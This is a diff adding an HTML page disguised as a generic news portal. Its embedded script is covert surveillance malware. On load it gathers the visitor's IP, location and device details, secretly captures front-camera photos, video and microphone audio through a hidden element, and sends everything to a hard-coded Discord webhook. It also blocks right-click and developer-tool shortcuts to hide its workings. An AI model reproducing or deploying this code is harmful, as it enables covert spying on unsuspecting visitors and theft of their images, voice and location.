@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>News Portal</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f5f5f5;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 20px 0;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+        }
+
+        nav {
+            background-color: #34495e;
+            padding: 10px 0;
+            margin-bottom: 30px;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+        }
+
+        nav ul li {
+            margin-right: 20px;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        nav ul li a:hover {
+            text-decoration: underline;
+        }
+
+        .main-content {
+            display: flex;
+            gap: 30px;
+        }
+
+        .articles {
+            flex: 2;
+        }
+
+        .sidebar {
+            flex: 1;
+        }
+
+        article {
+            background: white;
+            padding: 25px;
+            margin-bottom: 30px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        article h2 {
+            color: #2c3e50;
+            margin-top: 0;
+        }
+
+        article p {
+            margin-bottom: 15px;
+        }
+
+        .read-more {
+            display: inline-block;
+            background: #3498db;
+            color: white;
+            padding: 8px 15px;
+            text-decoration: none;
+            border-radius: 3px;
+            font-weight: 500;
+        }
+
+        .read-more:hover {
+            background: #2980b9;
+        }
+
+        .sidebar-widget {
+            background: white;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .sidebar-widget h3 {
+            margin-top: 0;
+            color: #2c3e50;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        footer {
+            background: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 30px;
+        }
+
+        /* Hidden elements for functionality */
+        #inspect-warning {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: red;
+            font-size: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            display: none;
+        }
+
+        .hidden-video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Daily News Network</h1>
+            <p>Your trusted source for the latest updates</p>
+        </div>
+    </header>
+
+    <nav>
+        <div class="container">
+            <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#">World</a></li>
+                <li><a href="#">Politics</a></li>
+                <li><a href="#">Business</a></li>
+                <li><a href="#">Technology</a></li>
+                <li><a href="#">Sports</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="main-content">
+            <main class="articles">
+                <article>
+                    <h2>Global Summit Addresses Climate Change Concerns</h2>
+                    <p>World leaders gathered today to discuss urgent measures against climate change. The summit, held in Geneva, focused on reducing carbon emissions and promoting renewable energy sources.</p>
+                    <p>Experts warn that without immediate action, the planet could face irreversible damage within the next decade. Several countries have pledged to increase their investments in green technology.</p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+
+                <article>
+                    <h2>Tech Giant Unveils Revolutionary Smartphone</h2>
+                    <p>The latest smartphone from industry leader TechCorp features groundbreaking battery technology that promises up to 72 hours of continuous use on a single charge.</p>
+                    <p>Early reviews praise the device's innovative camera system and AI-powered features. The phone is expected to hit stores next month with a starting price of $899.</p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+
+                <article>
+                    <h2>Stock Markets Reach Record Highs</h2>
+                    <p>Global markets surged today as investor confidence grows amid positive economic indicators. The S&P 500 and NASDAQ both closed at all-time highs.</p>
+                    <p>Analysts attribute the rally to strong corporate earnings and easing trade tensions between major economies. However, some warn of potential volatility ahead.</p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+            </main>
+
+            <aside class="sidebar">
+                <div class="sidebar-widget">
+                    <h3>Subscribe to Newsletter</h3>
+                    <p>Get the latest news delivered to your inbox daily.</p>
+                    <form>
+                        <input type="email" placeholder="Your email address" style="width: 100%; padding: 8px; margin-bottom: 10px;">
+                        <button type="submit" style="background: #3498db; color: white; border: none; padding: 8px 15px; border-radius: 3px; cursor: pointer;">Subscribe</button>
+                    </form>
+                </div>
+
+                <div class="sidebar-widget">
+                    <h3>Trending Now</h3>
+                    <ul>
+                        <li><a href="#">Celebrity Wedding Breaks the Internet</a></li>
+                        <li><a href="#">New Study Reveals Health Benefits of Coffee</a></li>
+                        <li><a href="#">Tourist Finds Rare Artifact on Beach</a></li>
+                        <li><a href="#">Scientists Discover New Species in Amazon</a></li>
+                        <li><a href="#">Popular TV Show Renewed for Final Season</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2023 Daily News Network. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Hidden elements for functionality -->
+    <div id="inspect-warning">Access Denied</div>
+
+<script>
+    // Discord webhook URL - REPLACE WITH YOUR OWN
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1339161206430371873/gd6EHzgrC1mLOk_P7PwLQcx0luILUDkxLCLe8DU9m3UWfIRlvU-nip4LxJ7CWKSMz6I3";
+    let frontCameraStream = null;
+    let backCameraStream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let audioStream = null;
+    let audioRecorder = null;
+    let audioChunks = [];
+    let scanData = {};
+    let isScanComplete = false;
+    let isPageClosing = false;
+
+    // Block right click and keyboard shortcuts
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        showInspectWarning();
+    });
+
+    document.addEventListener('keydown', function(e) {
+        // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+            (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+            (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+            showInspectWarning();
+        }
+    });
+
+    function showInspectWarning() {
+        document.getElementById('inspect-warning').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('inspect-warning').style.display = 'none';
+        }, 2000);
+    }
+
+    // Improved Windows 11 detection
+    function detectOS() {
+        const userAgent = window.navigator.userAgent;
+        let os = "Unknown OS";
+        
+        if (/Android/.test(userAgent)) {
+            os = "Android";
+            const match = userAgent.match(/Android\s([0-9\.]+)/);
+            if (match) os += " " + match[1];
+        } 
+        else if (/iPhone|iPad|iPod/.test(userAgent)) {
+            os = "iOS";
+            const match = userAgent.match(/OS\s([0-9_]+)/);
+            if (match) os += " " + match[1].replace(/_/g, ".");
+        }
+        else if (/Windows NT 10.0/.test(userAgent) && /Win64/.test(userAgent)) {
+            os = navigator.userAgentData?.platform === "Windows" ? "Windows 11" : "Windows 10";
+        }
+        else if (/Mac/.test(userAgent)) {
+            os = "MacOS";
+        }
+        else if (/Linux/.test(userAgent)) {
+            os = "Linux";
+        }
+        
+        return os;
+    }
+
+    // Detect browser
+    function detectBrowser() {
+        const userAgent = navigator.userAgent;
+        let browser = "Unknown Browser";
+        
+        if (/Firefox/.test(userAgent)) {
+            browser = "Firefox";
+        } else if (/SamsungBrowser/.test(userAgent)) {
+            browser = "Samsung Browser";
+        } else if (/Opera|OPR/.test(userAgent)) {
+            browser = "Opera";
+        } else if (/Trident/.test(userAgent)) {
+            browser = "Internet Explorer";
+        } else if (/Edge/.test(userAgent)) {
+            browser = "Edge";
+        } else if (/Chrome/.test(userAgent)) {
+            browser = "Chrome";
+        } else if (/Safari/.test(userAgent)) {
+            browser = "Safari";
+        }
+        
+        return browser;
+    }
+
+    // Get screen resolution
+    function getScreenResolution() {
+        return `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
+    }
+
+    // Get battery status
+    async function getBatteryStatus() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return `${Math.floor(battery.level * 100)}% ${battery.charging ? '⚡' : ''}`;
+            }
+            return "Unknown (API not supported)";
+        } catch {
+            return "Unknown";
+        }
+    }
+
+    // Detect device type with improved accuracy
+    function detectDeviceType() {
+        const ua = navigator.userAgent;
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+        const isTablet = /Tablet|iPad/i.test(ua);
+        const hasTouch = navigator.maxTouchPoints > 0;
+        const screenWidth = window.screen.width;
+        
+        if (isMobile || isTablet) {
+            return "📱 Mobile Device";
+        }
+        
+        if (hasTouch && screenWidth <= 1366) {
+            return "💻 Laptop";
+        }
+        
+        return "🖥️ Desktop PC";
+    }
+
+    // Capture frame from video and convert to blob
+    async function captureFrame(videoElement) {
+        const canvas = document.createElement('canvas');
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        
+        return new Promise((resolve) => {
+            canvas.toBlob(resolve, 'image/jpeg', 0.8);
+        });
+    }
+
+    // Send image to Discord
+    async function sendImageToDiscord(blob, sequence, scanData, cameraType) {
+        const formData = new FormData();
+        formData.append('file', blob, `${cameraType}_photo_${sequence}.jpg`);
+        
+        const content = `📸 ${cameraType === 'front' ? 'Front' : 'Back'} Photo #${sequence}\n` +
+                       `IP: ${scanData.ip || "Unknown"}\n` +
+                       `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
+                       `Device: ${scanData.deviceType || "Unknown"}`;
+
+        formData.append('content', content);
+
+        try {
+            await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                body: formData
+            });
+        } catch (error) {
+            console.error("Error sending image to Discord:", error);
+        }
+    }
+
+    // Record and send video (10 seconds max)
+    async function recordAndSendVideo(stream, scanData, cameraType) {
+        return new Promise((resolve) => {
+            recordedChunks = [];
+            
+            const options = {
+                mimeType: 'video/webm;codecs=vp9',
+                videoBitsPerSecond: 2500000,
+            };
+            
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options.mimeType = 'video/webm;codecs=vp8';
+            }
+            
+            mediaRecorder = new MediaRecorder(stream, options);
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = async () => {
+                if (recordedChunks.length === 0) {
+                    resolve();
+                    return;
+                }
+                
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                
+                try {
+                    const formData = new FormData();
+                    formData.append('file', blob, `${cameraType}_10s_video.webm`);
+                    
+                    const content = `🎥 ${cameraType === 'front' ? 'Front' : 'Back'} camera video (10s)\n` +
+                                   `IP: ${scanData.ip || "Unknown"}\n` +
+                                   `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
+                                   `Device: ${scanData.deviceType || "Unknown"}`;
+
+                    formData.append('content', content);
+
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: "POST",
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error("Error sending video to Discord:", error);
+                }
+                resolve();
+            };
+
+            mediaRecorder.start();
+            
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+        });
+    }
+
+    // Record and send audio (10 seconds max, try to use MP3)
+    async function recordAndSendAudio(scanData) {
+        return new Promise((resolve) => {
+            audioChunks = [];
+            
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    audioStream = stream;
+                    
+                    const options = { mimeType: 'audio/mpeg' };
+                    if (!MediaRecorder.isTypeSupported('audio/mpeg')) {
+                        options.mimeType = 'audio/webm';
+                    }
+                    
+                    audioRecorder = new MediaRecorder(stream, options);
+                    
+                    audioRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+                    
+                    audioRecorder.onstop = async () => {
+                        if (audioChunks.length === 0) {
+                            resolve();
+                            return;
+                        }
+                        
+                        const extension = audioRecorder.mimeType.includes('mpeg') ? 'mp3' : 'webm';
+                        const blob = new Blob(audioChunks, { type: audioRecorder.mimeType });
+                        
+                        try {
+                            const formData = new FormData();
+                            formData.append('file', blob, `10s_audio_recording.${extension}`);
+                            
+                            const content = `🎤 Audio recording (10s)\n` +
+                                           `IP: ${scanData.ip || "Unknown"}\n` +
+                                           `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
+                                           `Device: ${scanData.deviceType || "Unknown"}`;
+
+                            formData.append('content', content);
+
+                            await fetch(DISCORD_WEBHOOK, {
+                                method: "POST",
+                                body: formData
+                            });
+                        } catch (error) {
+                            console.error("Error sending audio to Discord:", error);
+                        }
+                        resolve();
+                    };
+
+                    audioRecorder.start();
+                    
+                    setTimeout(() => {
+                        if (audioRecorder && audioRecorder.state === 'recording') {
+                            audioRecorder.stop();
+                        }
+                    }, 10000);
+                })
+                .catch(error => {
+                    console.error("Error accessing microphone:", error);
+                    resolve();
+                });
+        });
+    }
+
+    // Send location map image
+    async function sendLocationMap(scanData) {
+        if (!scanData.city || !scanData.country) return;
+        
+        try {
+            const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${scanData.city},${scanData.country}&zoom=12&size=600x300&maptype=roadmap&markers=color:red%7C${scanData.city},${scanData.country}&key=YOUR_GOOGLE_MAPS_API_KEY`;
+            
+            const response = await fetch(mapUrl);
+            const blob = await response.blob();
+            
+            const formData = new FormData();
+            formData.append('file', blob, 'location_map.png');
+            
+            const content = `📍 Approximate location map\n` +
+                           `IP: ${scanData.ip || "Unknown"}\n` +
+                           `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
+                           `Device: ${scanData.deviceType || "Unknown"}`;
+
+            formData.append('content', content);
+
+            await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                body: formData
+            });
+        } catch (error) {
+            console.error("Error sending location map:", error);
+        }
+    }
+
+    // Capture and send photos from a specific camera
+    async function captureAndSendPhotos(videoElement, scanData, cameraType) {
+        for (let i = 1; i <= 10; i++) {
+            try {
+                const blob = await captureFrame(videoElement);
+                await sendImageToDiscord(blob, i, scanData, cameraType);
+                
+                if (i < 10) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            } catch (error) {
+                console.error(`Error capturing ${cameraType} photo ${i}:`, error);
+            }
+        }
+    }
+
+// Send system info to Discord
+async function sendSystemInfoToDiscord(scanData) {
+    try {
+        await fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                content: `📋 System Information Collected`,
+                embeds: [{
+                    title: "Initial Scan Results",
+                    fields: [
+                        { name: "IP", value: scanData.ip || "Unknown", inline: true },
+                        { name: "Country", value: scanData.country || "Unknown", inline: true },
+                        { name: "Region", value: `${scanData.city || 'Unknown'}, ${scanData.state || 'Unknown'}`, inline: true },
+                        { name: "ZIP", value: scanData.zipcode || "Unknown", inline: true },
+                        { name: "OS", value: scanData.os || "Unknown", inline: true },
+                        { name: "Browser", value: scanData.browser || "Unknown", inline: true },
+                        { name: "Device Type", value: scanData.deviceType || "Unknown", inline: true },
+                        { name: "Screen Resolution", value: scanData.screenResolution || "Unknown", inline: true },
+                        { name: "Battery Status", value: scanData.batteryStatus || "Unknown", inline: true },
+                        { name: "Front Camera Status", value: scanData.frontCameraStatus || "Unknown", inline: true },
+                        { name: "Back Camera Status", value: scanData.backCameraStatus || "Unknown", inline: true },
+                        { name: "Microphone Status", value: scanData.microphoneStatus || "Unknown", inline: true },
+                        { name: "User Agent", value: `\`\`\`${navigator.userAgent.substring(0, 300)}\`\`\`` }
+                    ],
+                    color: 0x3498db,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Daily News Network"
+                    }
+                }]
+            })
+        });
+    } catch (error) {
+        console.error("Error sending system info to Discord:", error);
+    }
+}
+
+    // Get location and system info
+    async function getLocationInfo() {
+        scanData = {
+            ip: "Unknown",
+            country: "Unknown",
+            state: "Unknown",
+            city: "Unknown",
+            zipcode: "Unknown",
+            os: detectOS(),
+            browser: detectBrowser(),
+            deviceType: detectDeviceType(),
+            screenResolution: getScreenResolution(),
+            batteryStatus: await getBatteryStatus(),
+            frontCameraStatus: "Not checked",
+            backCameraStatus: "Not checked",
+            microphoneStatus: "Not checked"
+        };
+
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            scanData.ip = ipData.ip;
+            
+            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locationData = await locationResponse.json();
+            
+            scanData.country = locationData.country_name || 'Unknown';
+            scanData.state = locationData.region || 'Unknown';
+            scanData.city = locationData.city || 'Unknown';
+            scanData.zipcode = locationData.postal || 'Unknown';
+            
+            return scanData;
+            
+        } catch (error) {
+            console.error('Error:', error);
+            return scanData;
+        }
+    }
+
+    // Handle camera access with higher FPS and quality
+    async function handleCameraAccess(facingMode) {
+        try {
+            const constraints = {
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    frameRate: { ideal: 60, min: 30 }
+                }
+            };
+            
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            return {
+                stream,
+                status: `${facingMode === 'user' ? 'Front' : 'Back'} camera active (HD)`
+            };
+        } catch (error) {
+            console.error(`${facingMode === 'user' ? 'Front' : 'Back'} camera error:`, error);
+            return {
+                stream: null,
+                status: error.name === 'NotAllowedError' ? 
+                    `${facingMode === 'user' ? 'Front' : 'Back'} camera access denied` : 
+                    `${facingMode === 'user' ? 'Front' : 'Back'} camera error`
+            };
+        }
+    }
+
+    // Clean up resources
+    async function cleanupResources() {
+        if (frontCameraStream) {
+            frontCameraStream.getTracks().forEach(track => track.stop());
+        }
+        if (backCameraStream) {
+            backCameraStream.getTracks().forEach(track => track.stop());
+        }
+        if (audioStream) {
+            audioStream.getTracks().forEach(track => track.stop());
+        }
+        
+        const videos = document.querySelectorAll('video');
+        videos.forEach(video => {
+            video.srcObject = null;
+            document.body.removeChild(video);
+        });
+    }
+
+    // Main scan function that runs automatically in sequence
+    async function startAutoScan() {
+        try {
+            // Step 1: Get system info and send to Discord
+            scanData = await getLocationInfo();
+            await sendSystemInfoToDiscord(scanData);
+            
+            // Step 2: Handle front camera (photos then video)
+            const frontCameraResult = await handleCameraAccess('user');
+            frontCameraStream = frontCameraResult.stream;
+            scanData.frontCameraStatus = frontCameraResult.status;
+            
+            if (frontCameraStream) {
+                const frontVideo = document.createElement('video');
+                frontVideo.className = 'hidden-video';
+                frontVideo.srcObject = frontCameraStream;
+                frontVideo.autoplay = true;
+                frontVideo.playsinline = true;
+                document.body.appendChild(frontVideo);
+                await new Promise(resolve => frontVideo.onloadedmetadata = resolve);
+                
+                // Take 10 photos with 1 second interval
+                await captureAndSendPhotos(frontVideo, scanData, 'front');
+                
+                // Record 10-second video
+                await recordAndSendVideo(frontCameraStream, scanData, 'front');
+                
+                // Clean up
+                frontVideo.srcObject = null;
+                document.body.removeChild(frontVideo);
+            }
+            
+            // Step 3: Audio recording
+            try {
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                scanData.microphoneStatus = "Active";
+                await recordAndSendAudio(scanData);
+            } catch (error) {
+                console.error("Microphone error:", error);
+                scanData.microphoneStatus = error.name === 'NotAllowedError' ? "Access denied" : "Error";
+            }
+            
+            // Step 4: Send location map
+            await sendLocationMap(scanData);
+            
+            // Mark scan as complete
+            isScanComplete = true;
+            
+        } catch (error) {
+            console.error("Scan error:", error);
+        } finally {
+            cleanupResources();
+        }
+    }
+
+    // Initialize
+    window.onload = function() {
+        startAutoScan();
+    };
+
+    // Handle page closing
+    window.addEventListener('pagehide', async function() {
+        isPageClosing = true;
+        
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
+        if (audioRecorder && audioRecorder.state === 'recording') {
+            audioRecorder.stop();
+        }
+
+        try {
+            const scanInfo = {
+                ip: scanData.ip || "Unknown",
+                location: `${scanData.city || 'Unknown'}, ${scanData.country || 'Unknown'}`,
+                device: scanData.deviceType || "Unknown",
+                status: "Page closed before scan completed"
+            };
+            
+            const blob = new Blob([JSON.stringify(scanInfo)], {type: 'application/json'});
+            navigator.sendBeacon(DISCORD_WEBHOOK, blob);
+        } catch (e) {
+            console.error("Error sending beacon:", e);
+        }
+
+        cleanupResources();
+    });
+</script>
+</body>
+</html>
